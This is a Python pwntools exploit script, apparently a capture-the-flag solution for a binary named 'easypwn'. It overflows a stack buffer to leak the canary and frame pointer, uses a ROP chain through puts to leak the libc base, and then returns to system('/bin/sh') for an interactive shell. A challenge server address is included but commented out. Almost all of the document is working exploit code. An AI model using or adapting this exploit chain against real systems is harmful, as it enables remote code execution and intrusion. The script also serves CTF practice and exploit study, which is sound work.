from pwn import *

remote_addr=['122.112.210.169',49153] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.terminal = ["tmux", "sp","-h"]
#context.log_level=True

#p=remote(remote_addr[0],remote_addr[1])
elf_path = "./easypwn"
p = process(elf_path)

libc = ELF("./libeasy.so")
libc1 = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(elf_path)

#gdb.attach(p, 'c')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
def dbg(address=0):
    if address==0:
        gdb.attach(p)
        pause()
    else:
        if address > 0xfffff:
            script="b *{:#x}\nc\n".format(address)
        else:
            script="b *$rebase({:#x})\nc\n".format(address)
        gdb.attach(p, script)
def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

if __name__ == '__main__':
    pop_rdi = 0x0000000000400903
    ret = 0x000000000040061e
    main_addr = 0x400757
    puts_got = libc.got["puts"]
    puts_plt = libc.plt["puts"]
    sla("it?(y or n)\n",'y')
    p.recvuntil('is ')

    easyinput = int(p.recv()[0:14],16)
    #print "easyinput :",easyinput
    #print rv()
    libeasybase = easyinput - 0x87a
    lg("easyinput",easyinput)
    lg("libeasybase",libeasybase)
    # leak canary rbp    ->first time to leak
    buff = 'A' * 0x68+'a' 
    sn(buff)
    p.recvuntil('\x61')
    tmp = p.recv()
    canary = u64(tmp[:7].rjust(8,'\x00'))
    rbp = u64(tmp[-6:].ljust(8,'\x00'))
    lg("canary:",canary)
    lg("rbp:",rbp)
    
    # second time to leak        leak putaddr to get libc  return to main
    buff = p64(puts_got+libeasybase) + p64(puts_plt+libeasybase) +p64(main_addr)+'A' * (0x68-0x18) + p64(canary) + p64(rbp)+p64(pop_rdi)
    #buff = 'A' * 0x68 + p64(canary) + p64(rbp)+p64(pop_rdi)+p64(puts_got+libeasybase) + p64(puts_plt+libeasybase) +p64(main_addr)
    gdb.attach(p)
    sn(buff)

    putaddr  = u64(ru('\x0a')[-7:-1].ljust(8,'\x00'))
    lg("putaddr",putaddr)
    libc1.address = putaddr - libc1.symbols['puts']
    lg("Libc address", libc1.address)
    system_addr = libc1.symbols["system"]
    sh_addr = libc1.search("/bin/sh").next()
    lg("system_addr", system_addr)
    lg("sh_addr", sh_addr)
    sla("it?(y or n)\n",'n')
    
    # return to system
    buff = p64(sh_addr) +p64(ret) + p64(system_addr) +p64(0xdeadbeef)+'A' * (0x68-0x20) + p64(canary) + p64(rbp)+p64(pop_rdi)
    
    sn(buff)
    p.interactive()
